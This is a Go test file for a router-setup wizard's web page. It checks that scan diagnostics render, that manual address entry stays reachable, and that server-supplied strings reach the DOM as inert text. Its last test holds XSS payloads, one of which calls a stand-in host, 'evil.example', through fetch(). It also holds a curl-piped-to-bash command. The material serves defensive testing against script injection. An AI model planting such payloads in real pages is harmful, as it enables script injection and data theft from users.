package app

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// discovery_ui_test.go pins the two wizard behaviours the operator did not have
// when he was blocked on 2026-09-25: a failure screen that says what was tried
// and what to do, and a way to type the router's address instead of having to
// re-run the script with positional arguments.
//
// The DOM-safety rule from dom_sink_test.go applies here too: this page is
// served from the origin that holds #password (the router's root password), so
// server-supplied strings (interface names, gateway addresses, remediation
// text) must reach the DOM as TEXT, never through the HTML parser.

// TestScanRendersServerDiagnostics: the failure view must be built from the
// server's structured diagnostics, not from one fixed sentence.
func TestScanRendersServerDiagnostics(t *testing.T) {
	html := string(indexHTML)

	// A container the diagnostic block is rendered into.
	if !strings.Contains(html, `id="scan-detail"`) {
		t.Error("index.html has no #scan-detail container for the diagnostic block")
	}

	body := funcBody(t, html, "scan")
	for _, want := range []string{"data.diagnostics", "renderScanFailure"} {
		if !strings.Contains(body, want) {
			t.Errorf("scan() must render the server diagnostics (missing %q):\n%s", want, body)
		}
	}
	// A transport-level failure (the wizard itself is gone, or the JSON is not
	// JSON) must still reach the same diagnostic path rather than a bare
	// sentence — that is the state the operator was in.
	if !strings.Contains(body, "renderScanFailure(null") && !strings.Contains(body, "renderScanFailure(undefined") {
		t.Errorf("scan() must fall back to renderScanFailure on a failed fetch:\n%s", body)
	}

	// The block renders interfaces, gateways, probes and remediation.
	render := funcBody(t, html, "renderScanFailure")
	for _, want := range []string{
		"diag.interfaces", "diag.gateways", "diag.probes",
		"diag.remediation", "diag.summary",
	} {
		if !strings.Contains(render, want) {
			t.Errorf("renderScanFailure() must render %q:\n%s", want, render)
		}
	}
	// The block must show the problem flag on an interface line (that is where
	// "link up, NO IPv4" / "no link" reach the operator).
	if !strings.Contains(render, "problem") {
		t.Errorf("renderScanFailure() must render the per-interface problem flag:\n%s", render)
	}
}

// TestManualAddressEntryIsNeverStranded pins deliverable 4 under the revised
// design (2026-10-05): the typed-address card is opt-in. It lives behind a
// sentinel option in the router dropdown, so it no longer competes with the
// scan result on every screen — but it can NEVER be stranded, and the sentinel
// is a control value, never an address.
func TestManualAddressEntryIsNeverStranded(t *testing.T) {
	html := string(indexHTML)

	// A real text input plus a real button, in their own card.
	for _, want := range []string{
		`id="manual-ip"`, `id="manual-btn"`, `id="manual-view"`, `id="manual-hint"`,
		`onclick="useManualIP()"`,
	} {
		if !strings.Contains(html, want) {
			t.Errorf("index.html is missing %s — the address can then only be supplied by re-running the script", want)
		}
	}

	// "Is the card shown?" has exactly one implementation to reason about.
	reveal := funcBody(t, html, "setManualAddressVisible")
	if !strings.Contains(reveal, "manual-view") {
		t.Errorf("setManualAddressVisible() must toggle #manual-view:\n%s", reveal)
	}

	// It stays available while scanning ...
	scanBody := funcBody(t, html, "scan")
	if !strings.Contains(scanBody, "setManualAddressVisible(true)") {
		t.Errorf("scan() must keep the manual address card available while it scans:\n%s", scanBody)
	}

	// ... and a fruitless scan leaves it OPEN. This is the rule that makes the
	// opt-in design safe: the dropdown is populated FROM scan results, so
	// gating the card behind an option in an EMPTY dropdown would leave the
	// operator with no way forward at all (the 2026-10-05 case: a live router
	// on 10.153.97.1, a subnet the scan could not guess).
	show := funcBody(t, html, "showSelectView")
	if !strings.Contains(show, "detectedRouters.length === 0") {
		t.Errorf("showSelectView() must leave the manual address card open when detection found nothing:\n%s", show)
	}

	// It is reachable from a NON-empty dropdown too, via a sentinel option ...
	if !strings.Contains(show, "CUSTOM_ADDRESS") {
		t.Errorf("showSelectView() must append the custom-address sentinel to the dropdown:\n%s", show)
	}
	// ... and the sentinel is never an address: it must be filtered by the one
	// accessor every consumer uses, so it cannot be identified, pre-staged or
	// deployed to as if it were a host.
	acc := funcBody(t, html, "selectedRouterIP")
	if !strings.Contains(acc, "CUSTOM_ADDRESS") {
		t.Errorf("selectedRouterIP() must never return the sentinel as an address:\n%s", acc)
	}
	for _, fn := range []string{
		"startDeploy", "startPreStage", "refreshRouterName", "checkReady",
		"wifiScan", "testUpstreamWifi", "trustHostKey", "selectedRouterInfo",
	} {
		if body := funcBody(t, html, fn); !strings.Contains(body, "selectedRouterIP()") {
			t.Errorf("%s() must read the chosen address through selectedRouterIP(), never the raw dropdown — the sentinel would otherwise reach the installer as an ip:\n%s", fn, body)
		}
	}
	// The only raw reads of the dropdown left are the two sentinel-aware
	// helpers: the accessor itself and the change handler that compares against
	// the sentinel. A third one is a leak.
	const rawRead = "getElementById('router-select').value"
	if got, allowed := strings.Count(html, rawRead),
		strings.Count(acc, rawRead)+strings.Count(funcBody(t, html, "onRouterChange"), rawRead); got != allowed {
		t.Errorf("%d raw read(s) of the router dropdown sit outside the sentinel-aware helpers (allowed %d: selectedRouterIP, onRouterChange)", got-allowed, allowed)
	}

	manualBody := funcBody(t, html, "useManualIP")
	// It POSTs the typed address to the identify endpoint …
	if !strings.Contains(manualBody, "/api/identify") {
		t.Errorf("useManualIP() must POST /api/identify:\n%s", manualBody)
	}
	// … and selects it, so Deploy works without discovery ever finding it.
	if !strings.Contains(manualBody, "sel.value = ip") && !strings.Contains(manualBody, "select.value = ip") {
		t.Errorf("useManualIP() must select the typed address:\n%s", manualBody)
	}
	// A malformed address must be refused locally (a typo must not become a
	// silent deploy against a wrong host).
	if !strings.Contains(manualBody, "validIPv4") {
		t.Errorf("useManualIP() must validate the address before using it:\n%s", manualBody)
	}

	// The validator itself: shape check only, no hostname/DNS.
	valid := funcBody(t, html, "validIPv4")
	if !strings.Contains(valid, "test") {
		t.Errorf("validIPv4() must be a real check:\n%s", valid)
	}
}

// TestRouterLabelShowsClassification pins the honest labelling in the dropdown:
// the server's note is shown, so an unverified LAN host cannot read as a
// router, and identified devices come first because the server sorted them.
func TestRouterLabelShowsClassification(t *testing.T) {
	html := string(indexHTML)
	body := funcBody(t, html, "formatRouterLabel")
	if !strings.Contains(body, "r.note") {
		t.Errorf("formatRouterLabel() must show the server's classification note:\n%s", body)
	}
	if !strings.Contains(body, "r.identified") {
		t.Errorf("formatRouterLabel() must distinguish identified routers from unverified hosts:\n%s", body)
	}
}

// TestHostileDiagnosticsRenderAsInertText executes the REAL renderScanFailure()
// under the recording DOM stub from dom_sink_test.go with an attacker-shaped
// diagnostic payload and asserts every value arrives as text.
func TestHostileDiagnosticsRenderAsInertText(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not installed — skipping the executed DOM check (the source contract still runs)")
	}

	html := string(indexHTML)
	script := jsDOMStub + "\nvar scanDiag = " + hostileDiagJSON + ";\n" +
		funcBody(t, html, "renderScanFailure") + "\n" + jsScanDiagTrigger

	dir := t.TempDir()
	path := filepath.Join(dir, "scan_diag_check.js")
	if err := os.WriteFile(path, []byte(script), 0o600); err != nil {
		t.Fatalf("write harness: %v", err)
	}
	out, err := exec.Command(node, path).CombinedOutput()
	if err != nil {
		t.Fatalf("node harness failed: %v\n%s", err, out)
	}
	var dump struct {
		Text     string   `json:"text"`
		HTMLSets []string `json:"htmlSets"`
		Kids     int      `json:"elementChildren"`
		Hostile  string   `json:"hostile"`
	}
	if err := json.Unmarshal(out, &dump); err != nil {
		t.Fatalf("harness did not return JSON: %v\n%s", err, out)
	}
	if len(dump.HTMLSets) != 0 {
		t.Errorf("diagnostic values went through innerHTML %d time(s) — an interface name such as %q would be parsed as markup in the origin that holds #password:\n%s",
			len(dump.HTMLSets), dump.Hostile, strings.Join(dump.HTMLSets, "\n"))
	}
	if !strings.Contains(dump.Text, dump.Hostile) {
		t.Errorf("the diagnostic text was not rendered at all (want it to contain %q):\n%s", dump.Hostile, dump.Text)
	}
	for _, want := range []string{"192.168.2.1", "link up, NO IPv4", "install-and-test.sh", "192.168.2.48"} {
		if !strings.Contains(dump.Text, want) {
			t.Errorf("rendered block is missing %q:\n%s", want, dump.Text)
		}
	}
}

// hostileDiagJSON is the diagnostic payload an attacker on the LAN can shape:
// interface names come from the host, but the neighbouring device controls
// what identification produced, and the section headers are interpolated next
// to them.
const hostileDiagJSON = `{
  summary: '<svg onload=alert(1)> nothing answered',
  interfaces: [{ name: '<img src=x onerror=fetch("//evil.example")>', state: 'up', carrier: '1', ipv4: ['192.168.2.33/24'], problem: '<b>link up, NO IPv4</b>' }],
  gateways: ['192.168.2.1'],
  probes: [{ ip: '192.168.2.48', source: '<script>alert(2)<\/script>', detail: 'x', ssh: false, httpPort: 80, note: '<i>unverified host</i>' }],
  sources: ['default-route gateway: 1 address(es)'],
  remediation: ['<img src=y onerror=alert(3)> use the LAN port', 'then bash <(curl -fsSL https://example.test/install-and-test.sh) <ROUTER-IP> \'\' <you@wallet.app>'],
  manualHint: '192.168.2.1'
}`

// jsScanDiagTrigger drives renderScanFailure once and dumps what the DOM got.
const jsScanDiagTrigger = `
(function () {
  renderScanFailure(scanDiag);
  function textOf(el) {
    var s = el._text || '';
    for (var i = 0; i < el.children.length; i++) {
      var c = el.children[i];
      s += c.textNode ? c.textContent : textOf(c);
    }
    return s;
  }
  function walk(el, out) {
    out.htmlSets = out.htmlSets.concat(el._innerHTMLSets || []);
    for (var i = 0; i < el.children.length; i++) {
      if (!el.children[i].textNode) walk(el.children[i], out);
    }
    return out;
  }
  var box = byId['scan-detail'];
  var out = walk(box, { htmlSets: [] });
  process.stdout.write(JSON.stringify({
    text: textOf(box),
    htmlSets: out.htmlSets,
    elementChildren: box.children.filter(function (c) { return !c.textNode; }).length,
    hostile: '<img src=x onerror=fetch("//evil.example")>'
  }));
})();
`
